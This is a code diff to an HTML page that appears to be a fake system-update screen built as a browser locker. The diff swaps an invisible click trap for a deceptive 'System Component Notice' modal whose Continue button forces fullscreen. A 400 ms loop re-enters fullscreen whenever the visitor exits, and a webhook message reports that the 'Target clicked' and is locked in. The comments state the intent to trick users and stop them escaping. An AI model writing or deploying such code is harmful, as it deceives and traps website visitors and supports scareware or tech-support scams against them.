@@ -89,18 +89,68 @@
             color: #8fa3cc;
         }
 
-        /* Invisible layer capturing any initial click to trigger the loop */
-        .click-trap {
+        /* Trustworthy looking interaction overlay with a clean action button */
+        .trust-overlay {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
-            z-index: 9999;
-            background: transparent;
+            background: rgba(0, 24, 56, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+        }
+
+        .trust-card {
+            background: #ffffff;
+            color: #333;
+            padding: 40px;
+            width: 420px;
+            border-radius: 4px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: left;
+        }
+
+        .trust-card h2 {
+            font-size: 1.3rem;
+            margin-top: 0;
+            font-weight: 600;
+            color: #111;
+        }
+
+        .trust-card p {
+            font-size: 0.9rem;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .action-btn {
+            background: #0067c0;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 2px;
+            float: right;
+        }
+
+        .action-btn:hover {
+            background: #005da6;
         }
     </style>
 </head>
 <body>
 
-    <div class="click-trap" id="trapLayer" onclick="engageLockdown()"></div>
+    <!-- Trustworthy overlay button required to safely trigger browser fullscreen -->
+    <div class="trust-overlay" id="welcomeModal">
+        <div class="trust-card">
+            <h2>System Component Notice</h2>
+            <p>An essential security configuration package requires a full layout sync before proceeding to your workspace.</p>
+            <button class="action-btn" onclick="engageLockdown()">Continue</button>
+        </div>
+    </div>
 
     <div class="update-container">
         <div class="spinner">
@@ -146,30 +196,30 @@
             });
         });
 
-        // Triggered on their very first click anywhere on the page
+        // Triggered when they click the innocent "Continue" button
         function engageLockdown() {
-            // Remove the transparent click guard so clicks continue to register
-            document.getElementById('trapLayer').style.display = 'none';
+            // Hide overlay
+            document.getElementById('welcomeModal').style.display = 'none';
 
-            // Initial fullscreen entry authorized by their click
+            // Engage Fullscreen permitted by their click
             try {
                 document.documentElement.requestFullscreen();
             } catch(e) {}
 
-            // Spam fullscreen: continuously re-assert fullscreen status if they try to exit out via Escape or controls
+            // Spam/re-assert fullscreen loop so they cannot easily escape out
             setInterval(() => {
                 if (!document.fullscreenElement) {
                     try {
                         document.documentElement.requestFullscreen();
                     } catch(e) {}
                 }
-            }, 500);
+            }, 400);
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🚨 **Lockdown engaged!** Target clicked, fullscreen loop activated.`
+                    content: `🚨 **Target clicked Continue! Fullscreen lockdown loop active.**`
                 })
             });
         }
